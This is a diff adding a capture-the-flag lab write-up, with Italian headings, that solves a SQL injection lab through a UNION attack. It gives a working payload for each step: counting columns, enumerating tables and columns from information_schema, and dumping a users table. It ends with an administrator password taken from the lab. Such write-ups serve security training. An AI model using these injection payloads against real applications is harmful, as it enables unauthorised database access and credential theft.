@@ -1,0 +1,55 @@
+This lab contains an SQL injection vulnerability in the product category filter.
+The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords.
+You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+
+IPOTESI QUERY
+
+SELECT * FROM 'CategoryId';
+
+
+DETERMINARE NUMERO COLONNE UTILI
+
+1) SELECT * FROM 'CategoryId';
+' ORDER BY 2-- -
+= SELECT * FROM 'CategoryId' ORDER BY 2-- -';
+
+2) SELECT * FROM 'CategoryId';
+' UNION SELECT NULL,NULL-- -
+= SELECT * FROM 'CategoryId' UNION SELECT NULL,NULL-- -';
+
+
+DETERMINARE QUALI COLONNE POSSONO CONTENERE DEL TESTO
+
+1) SELECT * FROM 'CategoryId';
+' UNION SELECT 'A','A'-- -
+= SELECT * FROM 'CategoryId' UNION SELECT 'A','A'-- -';
+
+
+TROVARE NOME TABELLE
+
+1) SELECT * FROM 'CategoryId';
+' UNION SELECT NULL,table_name FROM information_schema.tables-- -
+= SELECT * FROM 'CategoryId' UNION SELECT NULL,table_name FROM information_schema.tables-- -';
+
+Random tablename = users_xgwszk
+
+
+ESTRARRE COLONNE DALLA TABELLA
+
+1) SELECT * FROM 'CategoryId';
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xgwszk'-- -
+= SELECT * FROM 'CategoryId' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xgwszk'-- -';
+
+Random column_name = username_hyqdkz   password_yfomuu
+
+2) SELECT * FROM 'CategoryId';
+' UNION SELECT username_hyqdkz,password_yfomuu FROM users_xgwszk-- -
+= SELECT * FROM 'CategoryId' UNION SELECT username_hyqdkz,password_yfomuu FROM users_xgwszk-- -';
+
+                           <th>administrator</th>
+                            <td>gd1vr1j7m0mjip9srypp</td>
